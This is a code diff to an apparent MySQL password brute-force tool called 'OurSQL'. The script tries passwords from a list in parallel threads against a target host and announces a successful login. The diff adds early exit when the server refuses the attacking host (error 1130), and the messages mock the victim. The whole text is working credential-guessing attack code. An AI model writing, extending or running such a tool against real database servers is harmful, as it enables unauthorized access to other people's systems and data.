@@ -11,6 +11,7 @@ from datetime import datetime
 from threading import Thread, activeCount
 
 status = False
+allowed = True
 
 # Get current time in formatted form.
 def curTime():
@@ -46,14 +47,18 @@ def file_exists(parser, file):
 	return [x.strip() for x in open(file)]
 
 def connect(host, user, password, port):
+	global status, allowed
 	try:
 		conn = MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=3)
 		showSuccess("Login Success! {} : {}".format(user, password))
-		global status
 		status = True
 	except Exception as e:
-		# pass
-		showFailure("Login failed {} : {}".format(user, password))
+		errno, message = e.args
+		if errno == 1130:
+			showFailure("Comrade! Host {}:{} doesn't allow us to access user {}".format(host, port, user))
+			allowed = False
+		else:
+			showFailure("Login failed {} : {}".format(user, password))
 
 def exitScript():
 	showInfo("Exiting OurSQL...")
@@ -61,7 +66,7 @@ def exitScript():
 
 def main(args):
 	try:
-		global status
+		global status, allowed
 		user = args.user
 		port = args.port
 		host = args.host
@@ -70,6 +75,9 @@ def main(args):
 		for password in args.passwords:
 			if status:
 				showSuccess("Successfully made their MySQL to OurSQL!")
+				exitScript()
+			if not allowed:
+				showFailure("Ah... blyat!")
 				exitScript()
 			th = Thread(target=connect, args=(host, user, password, port))
 			th.daemon = True
